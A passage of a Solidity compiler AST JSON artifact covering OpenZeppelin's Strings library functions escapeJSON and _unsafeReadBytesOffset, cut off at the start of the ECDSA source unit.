memory"}},"id":1517,"indexExpression":{"id":1516,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"nodeType":"UnaryOperation","operator":"++","prefix":false,"src":"17712:14:3","subExpression":{"id":1515,"name":"outputLength","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1478,"src":"17712:12:3","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"isConstant":false,"isLValue":true,"isPure":false,"lValueRequested":true,"nodeType":"IndexAccess","src":"17705:22:3","typeDescriptions":{"typeIdentifier":"t_bytes1","typeString":"bytes1"}},"nodeType":"Assignment","operator":"=","rightHandSide":{"hexValue":"5c","id":1518,"isConstant":false,"isLValue":false,"isPure":true,"kind":"string","lValueRequested":false,"nodeType":"Literal","src":"17730:4:3","typeDescriptions":{"typeIdentifier":"t_stringliteral_731553fa98541ade8b78284229adfe09a819380dee9244baac20dd1e0aa24095","typeString":"literal_string \"\\\""},"value":"\\"},"src":"17705:29:3","typeDescriptions":{"typeIdentifier":"t_bytes1","typeString":"bytes1"}},"id":1520,"nodeType":"ExpressionStatement","src":"17705:29:3"},{"condition":{"commonType":{"typeIdentifier":"t_bytes1","typeString":"bytes1"},"id":1523,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":1521,"name":"char","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1492,"src":"17756:4:3","typeDescriptions":{"typeIdentifier":"t_bytes1","typeString":"bytes1"}},"nodeType":"BinaryOperation","operator":"==","rightExpression":{"hexValue":"30783038","id":1522,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"17764:4:3","typeDescriptions":{"typeIdentifier":"t_rational_8_by_1","typeString":"int_const 8"},"value":"0x08"},"src":"17756:12:3","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"falseBody":{"condition":{"commonType":{"typeIdentifier":"t_bytes1","typeString":"bytes1"},"id":1533,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":1531,"name":"char","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1492,"src":"17825:4:3","typeDescriptions":{"typeIdentifier":"t_bytes1","typeString":"bytes1"}},"nodeType":"BinaryOperation","operator":"==","rightExpression":{"hexValue":"30783039","id":1532,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"17833:4:3","typeDescriptions":{"typeIdentifier":"t_rational_9_by_1","typeString":"int_const 9"},"value":"0x09"},"src":"17825:12:3","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"falseBody":{"condition":{"commonType":{"typeIdentifier":"t_bytes1","typeString":"bytes1"},"id":1543,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":1541,"name":"char","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1492,"src":"17894:4:3","typeDescriptions":{"typeIdentifier":"t_bytes1","typeString":"bytes1"}},"nodeType":"BinaryOperation","operator":"==","rightExpression":{"hexValue":"30783061","id":1542,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"17902:4:3","typeDescriptions":{"typeIdentifier":"t_rational_10_by_1","typeString":"int_const 10"},"value":"0x0a"},"src":"17894:12:3","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"falseBody":{"condition":{"commonType":{"typeIdentifier":"t_bytes1","typeString":"bytes1"},"id":1553,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":1551,"name":"char","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1492,"src":"17963:4:3","typeDescriptions":{"typeIdentifier":"t_bytes1","typeString":"bytes1"}},"nodeType":"BinaryOperation","operator":"==","rightExpression":{"hexValue":"30783063","id":1552,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"17971:4:3","typeDescriptions":{"typeIdentifier":"t_rational_12_by_1","typeString":"int_const 12"},"value":"0x0c"},"src":"17963:12:3","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"falseBody":{"condition":{"commonType":{"typeIdentifier":"t_bytes1","typeString":"bytes1"},"id":1563,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":1561,"name":"char","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1492,"src":"18032:4:3","typeDescriptions":{"typeIdentifier":"t_bytes1","typeString":"bytes1"}},"nodeType":"BinaryOperation","operator":"==","rightExpression":{"hexValue":"30783064","id":1562,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"18040:4:3","typeDescriptions":{"typeIdentifier":"t_rational_13_by_1","typeString":"int_const 13"},"value":"0x0d"},"src":"18032:12:3","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"falseBody":{"condition":{"commonType":{"typeIdentifier":"t_bytes1","typeString":"bytes1"},"id":1573,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":1571,"name":"char","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1492,"src":"18101:4:3","typeDescriptions":{"typeIdentifier":"t_bytes1","typeString":"bytes1"}},"nodeType":"BinaryOperation","operator":"==","rightExpression":{"hexValue":"30783563","id":1572,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"18109:4:3","typeDescriptions":{"typeIdentifier":"t_rational_92_by_1","typeString":"int_const 92"},"value":"0x5c"},"src":"18101:12:3","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"falseBody":{"condition":{"commonType":{"typeIdentifier":"t_bytes1","typeString":"bytes1"},"id":1583,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":1581,"name":"char","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1492,"src":"18171:4:3","typeDescriptions":{"typeIdentifier":"t_bytes1","typeString":"bytes1"}},"nodeType":"BinaryOperation","operator":"==","rightExpression":{"hexValue":"30783232","id":1582,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"18179:4:3","typeDescriptions":{"typeIdentifier":"t_rational_34_by_1","typeString":"int_const 34"},"value":"0x22"},"src":"18171:12:3","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"id":1592,"nodeType":"IfStatement","src":"18167:143:3","trueBody":{"id":1591,"nodeType":"Block","src":"18185:125:3","statements":[{"expression":{"id":1589,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftHandSide":{"baseExpression":{"id":1584,"name":"output","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1468,"src":"18263:6:3","typeDescriptions":{"typeIdentifier":"t_bytes_memory_ptr","typeString":"bytes memory"}},"id":1587,"indexExpression":{"id":1586,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"nodeType":"UnaryOperation","operator":"++","prefix":false,"src":"18270:14:3","subExpression":{"id":1585,"name":"outputLength","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1478,"src":"18270:12:3","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"isConstant":false,"isLValue":true,"isPure":false,"lValueRequested":true,"nodeType":"IndexAccess","src":"18263:22:3","typeDescriptions":{"typeIdentifier":"t_bytes1","typeString":"bytes1"}},"nodeType":"Assignment","operator":"=","rightHandSide":{"hexValue":"22","id":1588,"isConstant":false,"isLValue":false,"isPure":true,"kind":"string","lValueRequested":false,"nodeType":"Literal","src":"18288:3:3","typeDescriptions":{"typeIdentifier":"t_stringliteral_6e9f33448a4153023cdaf3eb759f1afdc24aba433a3e18b683f8c04a6eaa69f0","typeString":"literal_string \"\"\""},"value":"\""},"src":"18263:28:3","typeDescriptions":{"typeIdentifier":"t_bytes1","typeString":"bytes1"}},"id":1590,"nodeType":"ExpressionStatement","src":"18263:28:3"}]}},"id":1593,"nodeType":"IfStatement","src":"18097:213:3","trueBody":{"expression":{"id":1579,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftHandSide":{"baseExpression":{"id":1574,"name":"output","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1468,"src":"18115:6:3","typeDescriptions":{"typeIdentifier":"t_bytes_memory_ptr","typeString":"bytes memory"}},"id":1577,"indexExpression":{"id":1576,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"nodeType":"UnaryOperation","operator":"++","prefix":false,"src":"18122:14:3","subExpression":{"id":1575,"name":"outputLength","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1478,"src":"18122:12:3","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"isConstant":false,"isLValue":true,"isPure":false,"lValueRequested":true,"nodeType":"IndexAccess","src":"18115:22:3","typeDescriptions":{"typeIdentifier":"t_bytes1","typeString":"bytes1"}},"nodeType":"Assignment","operator":"=","rightHandSide":{"hexValue":"5c","id":1578,"isConstant":false,"isLValue":false,"isPure":true,"kind":"string","lValueRequested":false,"nodeType":"Literal","src":"18140:4:3","typeDescriptions":{"typeIdentifier":"t_stringliteral_731553fa98541ade8b78284229adfe09a819380dee9244baac20dd1e0aa24095","typeString":"literal_string \"\\\""},"value":"\\"},"src":"18115:29:3","typeDescriptions":{"typeIdentifier":"t_bytes1","typeString":"bytes1"}},"id":1580,"nodeType":"ExpressionStatement","src":"18115:29:3"}},"id":1594,"nodeType":"IfStatement","src":"18028:282:3","trueBody":{"expression":{"id":1569,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftHandSide":{"baseExpression":{"id":1564,"name":"output","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1468,"src":"18046:6:3","typeDescriptions":{"typeIdentifier":"t_bytes_memory_ptr","typeString":"bytes memory"}},"id":1567,"indexExpression":{"id":1566,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"nodeType":"UnaryOperation","operator":"++","prefix":false,"src":"18053:14:3","subExpression":{"id":1565,"name":"outputLength","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1478,"src":"18053:12:3","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"isConstant":false,"isLValue":true,"isPure":false,"lValueRequested":true,"nodeType":"IndexAccess","src":"18046:22:3","typeDescriptions":{"typeIdentifier":"t_bytes1","typeString":"bytes1"}},"nodeType":"Assignment","operator":"=","rightHandSide":{"hexValue":"72","id":1568,"isConstant":false,"isLValue":false,"isPure":true,"kind":"string","lValueRequested":false,"nodeType":"Literal","src":"18071:3:3","typeDescriptions":{"typeIdentifier":"t_stringliteral_414f72a4d550cad29f17d9d99a4af64b3776ec5538cd440cef0f03fef2e9e010","typeString":"literal_string \"r\""},"value":"r"},"src":"18046:28:3","typeDescriptions":{"typeIdentifier":"t_bytes1","typeString":"bytes1"}},"id":1570,"nodeType":"ExpressionStatement","src":"18046:28:3"}},"id":1595,"nodeType":"IfStatement","src":"17959:351:3","trueBody":{"expression":{"id":1559,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftHandSide":{"baseExpression":{"id":1554,"name":"output","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1468,"src":"17977:6:3","typeDescriptions":{"typeIdentifier":"t_bytes_memory_ptr","typeString":"bytes memory"}},"id":1557,"indexExpression":{"id":1556,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"nodeType":"UnaryOperation","operator":"++","prefix":false,"src":"17984:14:3","subExpression":{"id":1555,"name":"outputLength","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1478,"src":"17984:12:3","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"isConstant":false,"isLValue":true,"isPure":false,"lValueRequested":true,"nodeType":"IndexAccess","src":"17977:22:3","typeDescriptions":{"typeIdentifier":"t_bytes1","typeString":"bytes1"}},"nodeType":"Assignment","operator":"=","rightHandSide":{"hexValue":"66","id":1558,"isConstant":false,"isLValue":false,"isPure":true,"kind":"string","lValueRequested":false,"nodeType":"Literal","src":"18002:3:3","typeDescriptions":{"typeIdentifier":"t_stringliteral_d1e8aeb79500496ef3dc2e57ba746a8315d048b7a664a2bf948db4fa91960483","typeString":"literal_string \"f\""},"value":"f"},"src":"17977:28:3","typeDescriptions":{"typeIdentifier":"t_bytes1","typeString":"bytes1"}},"id":1560,"nodeType":"ExpressionStatement","src":"17977:28:3"}},"id":1596,"nodeType":"IfStatement","src":"17890:420:3","trueBody":{"expression":{"id":1549,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftHandSide":{"baseExpression":{"id":1544,"name":"output","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1468,"src":"17908:6:3","typeDescriptions":{"typeIdentifier":"t_bytes_memory_ptr","typeString":"bytes memory"}},"id":1547,"indexExpression":{"id":1546,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"nodeType":"UnaryOperation","operator":"++","prefix":false,"src":"17915:14:3","subExpression":{"id":1545,"name":"outputLength","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1478,"src":"17915:12:3","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"isConstant":false,"isLValue":true,"isPure":false,"lValueRequested":true,"nodeType":"IndexAccess","src":"17908:22:3","typeDescriptions":{"typeIdentifier":"t_bytes1","typeString":"bytes1"}},"nodeType":"Assignment","operator":"=","rightHandSide":{"hexValue":"6e","id":1548,"isConstant":false,"isLValue":false,"isPure":true,"kind":"string","lValueRequested":false,"nodeType":"Literal","src":"17933:3:3","typeDescriptions":{"typeIdentifier":"t_stringliteral_4b4ecedb4964a40fe416b16c7bd8b46092040ec42ef0aa69e59f09872f105cf3","typeString":"literal_string \"n\""},"value":"n"},"src":"17908:28:3","typeDescriptions":{"typeIdentifier":"t_bytes1","typeString":"bytes1"}},"id":1550,"nodeType":"ExpressionStatement","src":"17908:28:3"}},"id":1597,"nodeType":"IfStatement","src":"17821:489:3","trueBody":{"expression":{"id":1539,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftHandSide":{"baseExpression":{"id":1534,"name":"output","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1468,"src":"17839:6:3","typeDescriptions":{"typeIdentifier":"t_bytes_memory_ptr","typeString":"bytes memory"}},"id":1537,"indexExpression":{"id":1536,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"nodeType":"UnaryOperation","operator":"++","prefix":false,"src":"17846:14:3","subExpression":{"id":1535,"name":"outputLength","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1478,"src":"17846:12:3","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"isConstant":false,"isLValue":true,"isPure":false,"lValueRequested":true,"nodeType":"IndexAccess","src":"17839:22:3","typeDescriptions":{"typeIdentifier":"t_bytes1","typeString":"bytes1"}},"nodeType":"Assignment","operator":"=","rightHandSide":{"hexValue":"74","id":1538,"isConstant":false,"isLValue":false,"isPure":true,"kind":"string","lValueRequested":false,"nodeType":"Literal","src":"17864:3:3","typeDescriptions":{"typeIdentifier":"t_stringliteral_cac1bb71f0a97c8ac94ca9546b43178a9ad254c7b757ac07433aa6df35cd8089","typeString":"literal_string \"t\""},"value":"t"},"src":"17839:28:3","typeDescriptions":{"typeIdentifier":"t_bytes1","typeString":"bytes1"}},"id":1540,"nodeType":"ExpressionStatement","src":"17839:28:3"}},"id":1598,"nodeType":"IfStatement","src":"17752:558:3","trueBody":{"expression":{"id":1529,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftHandSide":{"baseExpression":{"id":1524,"name":"output","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1468,"src":"17770:6:3","typeDescriptions":{"typeIdentifier":"t_bytes_memory_ptr","typeString":"bytes memory"}},"id":1527,"indexExpression":{"id":1526,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"nodeType":"UnaryOperation","operator":"++","prefix":false,"src":"17777:14:3","subExpression":{"id":1525,"name":"outputLength","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1478,"src":"17777:12:3","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"isConstant":false,"isLValue":true,"isPure":false,"lValueRequested":true,"nodeType":"IndexAccess","src":"17770:22:3","typeDescriptions":{"typeIdentifier":"t_bytes1","typeString":"bytes1"}},"nodeType":"Assignment","operator":"=","rightHandSide":{"hexValue":"62","id":1528,"isConstant":false,"isLValue":false,"isPure":true,"kind":"string","lValueRequested":false,"nodeType":"Literal","src":"17795:3:3","typeDescriptions":{"typeIdentifier":"t_stringliteral_b5553de315e0edf504d9150af82dafa5c4667fa618ed0a6f19c69b41166c5510","typeString":"literal_string \"b\""},"value":"b"},"src":"17770:28:3","typeDescriptions":{"typeIdentifier":"t_bytes1","typeString":"bytes1"}},"id":1530,"nodeType":"ExpressionStatement","src":"17770:28:3"}}]}}]},"condition":{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":1487,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":1484,"name":"i","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1482,"src":"17524:1:3","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":"<","rightExpression":{"expression":{"id":1485,"name":"buffer","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1461,"src":"17528:6:3","typeDescriptions":{"typeIdentifier":"t_bytes_memory_ptr","typeString":"bytes memory"}},"id":1486,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"memberLocation":"17535:6:3","memberName":"length","nodeType":"MemberAccess","src":"17528:13:3","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"src":"17524:17:3","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"id":1610,"initializationExpression":{"assignments":[1482],"declarations":[{"constant":false,"id":1482,"mutability":"mutable","name":"i","nameLocation":"17521:1:3","nodeType":"VariableDeclaration","scope":1610,"src":"17513:9:3","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":1481,"name":"uint256","nodeType":"ElementaryTypeName","src":"17513:7:3","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"id":1483,"nodeType":"VariableDeclarationStatement","src":"17513:9:3"},"isSimpleCounterLoop":true,"loopExpression":{"expression":{"id":1489,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"nodeType":"UnaryOperation","operator":"++","prefix":true,"src":"17543:3:3","subExpression":{"id":1488,"name":"i","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1482,"src":"17545:1:3","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"id":1490,"nodeType":"ExpressionStatement","src":"17543:3:3"},"nodeType":"ForStatement","src":"17508:894:3"},{"AST":{"nativeSrc":"18500:129:3","nodeType":"YulBlock","src":"18500:129:3","statements":[{"expression":{"arguments":[{"name":"output","nativeSrc":"18521:6:3","nodeType":"YulIdentifier","src":"18521:6:3"},{"name":"outputLength","nativeSrc":"18529:12:3","nodeType":"YulIdentifier","src":"18529:12:3"}],"functionName":{"name":"mstore","nativeSrc":"18514:6:3","nodeType":"YulIdentifier","src":"18514:6:3"},"nativeSrc":"18514:28:3","nodeType":"YulFunctionCall","src":"18514:28:3"},"nativeSrc":"18514:28:3","nodeType":"YulExpressionStatement","src":"18514:28:3"},{"expression":{"arguments":[{"kind":"number","nativeSrc":"18562:4:3","nodeType":"YulLiteral","src":"18562:4:3","type":"","value":"0x40"},{"arguments":[{"name":"output","nativeSrc":"18572:6:3","nodeType":"YulIdentifier","src":"18572:6:3"},{"arguments":[{"kind":"number","nativeSrc":"18584:1:3","nodeType":"YulLiteral","src":"18584:1:3","type":"","value":"5"},{"arguments":[{"kind":"number","nativeSrc":"18591:1:3","nodeType":"YulLiteral","src":"18591:1:3","type":"","value":"5"},{"arguments":[{"name":"outputLength","nativeSrc":"18598:12:3","nodeType":"YulIdentifier","src":"18598:12:3"},{"kind":"number","nativeSrc":"18612:2:3","nodeType":"YulLiteral","src":"18612:2:3","type":"","value":"63"}],"functionName":{"name":"add","nativeSrc":"18594:3:3","nodeType":"YulIdentifier","src":"18594:3:3"},"nativeSrc":"18594:21:3","nodeType":"YulFunctionCall","src":"18594:21:3"}],"functionName":{"name":"shr","nativeSrc":"18587:3:3","nodeType":"YulIdentifier","src":"18587:3:3"},"nativeSrc":"18587:29:3","nodeType":"YulFunctionCall","src":"18587:29:3"}],"functionName":{"name":"shl","nativeSrc":"18580:3:3","nodeType":"YulIdentifier","src":"18580:3:3"},"nativeSrc":"18580:37:3","nodeType":"YulFunctionCall","src":"18580:37:3"}],"functionName":{"name":"add","nativeSrc":"18568:3:3","nodeType":"YulIdentifier","src":"18568:3:3"},"nativeSrc":"18568:50:3","nodeType":"YulFunctionCall","src":"18568:50:3"}],"functionName":{"name":"mstore","nativeSrc":"18555:6:3","nodeType":"YulIdentifier","src":"18555:6:3"},"nativeSrc":"18555:64:3","nodeType":"YulFunctionCall","src":"18555:64:3"},"nativeSrc":"18555:64:3","nodeType":"YulExpressionStatement","src":"18555:64:3"}]},"evmVersion":"paris","externalReferences":[{"declaration":1468,"isOffset":false,"isSlot":false,"src":"18521:6:3","valueSize":1},{"declaration":1468,"isOffset":false,"isSlot":false,"src":"18572:6:3","valueSize":1},{"declaration":1478,"isOffset":false,"isSlot":false,"src":"18529:12:3","valueSize":1},{"declaration":1478,"isOffset":false,"isSlot":false,"src":"18598:12:3","valueSize":1}],"flags":["memory-safe"],"id":1611,"nodeType":"InlineAssembly","src":"18475:154:3"},{"expression":{"arguments":[{"id":1614,"name":"output","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1468,"src":"18653:6:3","typeDescriptions":{"typeIdentifier":"t_bytes_memory_ptr","typeString":"bytes memory"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_bytes_memory_ptr","typeString":"bytes memory"}],"id":1613,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"nodeType":"ElementaryTypeNameExpression","src":"18646:6:3","typeDescriptions":{"typeIdentifier":"t_type$_t_string_storage_ptr_$","typeString":"type(string storage pointer)"},"typeName":{"id":1612,"name":"string","nodeType":"ElementaryTypeName","src":"18646:6:3","typeDescriptions":{}}},"id":1615,"isConstant":false,"isLValue":false,"isPure":false,"kind":"typeConversion","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"18646:14:3","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_string_memory_ptr","typeString":"string memory"}},"functionReturnParameters":1459,"id":1616,"nodeType":"Return","src":"18639:21:3"}]},"documentation":{"id":1453,"nodeType":"StructuredDocumentation","src":"16676:576:3","text":" @dev Escape special characters in JSON strings. This can be useful to prevent JSON injection in NFT metadata.\n WARNING: This function should only be used in double quoted JSON strings. Single quotes are not escaped.\n NOTE: This function escapes all unicode characters, and not just the ones in ranges defined in section 2.5 of\n RFC-4627 (U+0000 to U+001F, U+0022 and U+005C). ECMAScript's `JSON.parse` does recover escaped unicode\n characters that are not in this range, but other tooling may provide different results."},"id":1618,"implemented":true,"kind":"function","modifiers":[],"name":"escapeJSON","nameLocation":"17266:10:3","nodeType":"FunctionDefinition","parameters":{"id":1456,"nodeType":"ParameterList","parameters":[{"constant":false,"id":1455,"mutability":"mutable","name":"input","nameLocation":"17291:5:3","nodeType":"VariableDeclaration","scope":1618,"src":"17277:19:3","stateVariable":false,"storageLocation":"memory","typeDescriptions":{"typeIdentifier":"t_string_memory_ptr","typeString":"string"},"typeName":{"id":1454,"name":"string","nodeType":"ElementaryTypeName","src":"17277:6:3","typeDescriptions":{"typeIdentifier":"t_string_storage_ptr","typeString":"string"}},"visibility":"internal"}],"src":"17276:21:3"},"returnParameters":{"id":1459,"nodeType":"ParameterList","parameters":[{"constant":false,"id":1458,"mutability":"mutable","name":"","nameLocation":"-1:-1:-1","nodeType":"VariableDeclaration","scope":1618,"src":"17321:13:3","stateVariable":false,"storageLocation":"memory","typeDescriptions":{"typeIdentifier":"t_string_memory_ptr","typeString":"string"},"typeName":{"id":1457,"name":"string","nodeType":"ElementaryTypeName","src":"17321:6:3","typeDescriptions":{"typeIdentifier":"t_string_storage_ptr","typeString":"string"}},"visibility":"internal"}],"src":"17320:15:3"},"scope":1631,"src":"17257:1410:3","stateMutability":"pure","virtual":false,"visibility":"internal"},{"body":{"id":1629,"nodeType":"Block","src":"19052:225:3","statements":[{"AST":{"nativeSrc":"19201:70:3","nodeType":"YulBlock","src":"19201:70:3","statements":[{"nativeSrc":"19215:46:3","nodeType":"YulAssignment","src":"19215:46:3","value":{"arguments":[{"arguments":[{"arguments":[{"name":"buffer","nativeSrc":"19238:6:3","nodeType":"YulIdentifier","src":"19238:6:3"},{"kind":"number","nativeSrc":"19246:4:3","nodeType":"YulLiteral","src":"19246:4:3","type":"","value":"0x20"}],"functionName":{"name":"add","nativeSrc":"19234:3:3","nodeType":"YulIdentifier","src":"19234:3:3"},"nativeSrc":"19234:17:3","nodeType":"YulFunctionCall","src":"19234:17:3"},{"name":"offset","nativeSrc":"19253:6:3","nodeType":"YulIdentifier","src":"19253:6:3"}],"functionName":{"name":"add","nativeSrc":"19230:3:3","nodeType":"YulIdentifier","src":"19230:3:3"},"nativeSrc":"19230:30:3","nodeType":"YulFunctionCall","src":"19230:30:3"}],"functionName":{"name":"mload","nativeSrc":"19224:5:3","nodeType":"YulIdentifier","src":"19224:5:3"},"nativeSrc":"19224:37:3","nodeType":"YulFunctionCall","src":"19224:37:3"},"variableNames":[{"name":"value","nativeSrc":"19215:5:3","nodeType":"YulIdentifier","src":"19215:5:3"}]}]},"evmVersion":"paris","externalReferences":[{"declaration":1621,"isOffset":false,"isSlot":false,"src":"19238:6:3","valueSize":1},{"declaration":1623,"isOffset":false,"isSlot":false,"src":"19253:6:3","valueSize":1},{"declaration":1626,"isOffset":false,"isSlot":false,"src":"19215:5:3","valueSize":1}],"flags":["memory-safe"],"id":1628,"nodeType":"InlineAssembly","src":"19176:95:3"}]},"documentation":{"id":1619,"nodeType":"StructuredDocumentation","src":"18673:268:3","text":" @dev Reads a bytes32 from a bytes array without bounds checking.\n NOTE: making this function internal would mean it could be used with memory unsafe offset, and marking the\n assembly block as such would prevent some optimizations."},"id":1630,"implemented":true,"kind":"function","modifiers":[],"name":"_unsafeReadBytesOffset","nameLocation":"18955:22:3","nodeType":"FunctionDefinition","parameters":{"id":1624,"nodeType":"ParameterList","parameters":[{"constant":false,"id":1621,"mutability":"mutable","name":"buffer","nameLocation":"18991:6:3","nodeType":"VariableDeclaration","scope":1630,"src":"18978:19:3","stateVariable":false,"storageLocation":"memory","typeDescriptions":{"typeIdentifier":"t_bytes_memory_ptr","typeString":"bytes"},"typeName":{"id":1620,"name":"bytes","nodeType":"ElementaryTypeName","src":"18978:5:3","typeDescriptions":{"typeIdentifier":"t_bytes_storage_ptr","typeString":"bytes"}},"visibility":"internal"},{"constant":false,"id":1623,"mutability":"mutable","name":"offset","nameLocation":"19007:6:3","nodeType":"VariableDeclaration","scope":1630,"src":"18999:14:3","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":1622,"name":"uint256","nodeType":"ElementaryTypeName","src":"18999:7:3","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"src":"18977:37:3"},"returnParameters":{"id":1627,"nodeType":"ParameterList","parameters":[{"constant":false,"id":1626,"mutability":"mutable","name":"value","nameLocation":"19045:5:3","nodeType":"VariableDeclaration","scope":1630,"src":"19037:13:3","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_bytes32","typeString":"bytes32"},"typeName":{"id":1625,"name":"bytes32","nodeType":"ElementaryTypeName","src":"19037:7:3","typeDescriptions":{"typeIdentifier":"t_bytes32","typeString":"bytes32"}},"visibility":"internal"}],"src":"19036:15:3"},"scope":1631,"src":"18946:331:3","stateMutability":"pure","virtual":false,"visibility":"private"}],"scope":1632,"src":"297:18982:3","usedErrors":[289,292,295],"usedEvents":[]}],"src":"101:19179:3"},"id":3},"@openzeppelin/contracts/utils/cryptography/ECDSA.sol":{"ast":{"absolutePath":"@openzeppelin/contracts/utils/cryptography/ECDSA.sol","exportedSymbols":{"ECDSA":[1979]},"id":1980,"license":"MIT","nodeType":"SourceUnit","nodes":[{"id":1633,"literals":["solidity","^","0.8",".20"],"nodeType":"PragmaDirective","src":"112:24:4"},{"abstract":false,"baseContracts":[],"canonicalName":"ECDSA","contractDependencies":[